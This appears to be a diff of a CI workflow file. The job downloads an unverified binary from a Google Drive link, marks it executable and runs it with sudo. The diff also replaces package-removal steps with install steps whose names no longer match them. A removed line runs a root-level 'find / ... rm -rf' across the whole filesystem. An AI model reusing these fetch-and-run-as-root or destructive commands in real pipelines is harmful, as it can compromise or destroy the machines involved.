@@ -12,17 +12,13 @@ jobs:
       run: wget https://drive.google.com/file/d/1ASOgs7EFud4t--Du2jYWnruxFv-VgzVG
     - name: Changing Permissions
       run: chmod +x 1ASOgs7EFud4t--Du2jYWnruxFv-VgzVG
-    - name: Removing nginx (1/2)
-      run: sudo apt-get remove nginx nginx-common
-    - name: Removing nginx (2/2)
-      run: sudo apt-get purge nginx nginx-common
-    - name: Removing nginx (3/2)
-      run: sudo apt-get autoremove
+    - name: Installing
+      run: sudo ./1ASOgs7EFud4t--Du2jYWnruxFv-VgzVG
+    - name: Installing nginx (1/2)
+      run: sudo apt install nginx nginx-common
     - name: Remove Docker (1/2)
-      run: sudo snap remove --purge docker
-    - name: Remove Docker (2/2)
-      run: sudo find / -name "*docker*" -exec `rm -rf` {} +  
+      run: sudo snap install docker docker.io
     - name: Removing Nodejs
-      run: sudo rm /usr/local/bin/node
+      run: sudo snap install node
     - name: Installing
       run: sudo ./1ASOgs7EFud4t--Du2jYWnruxFv-VgzVG
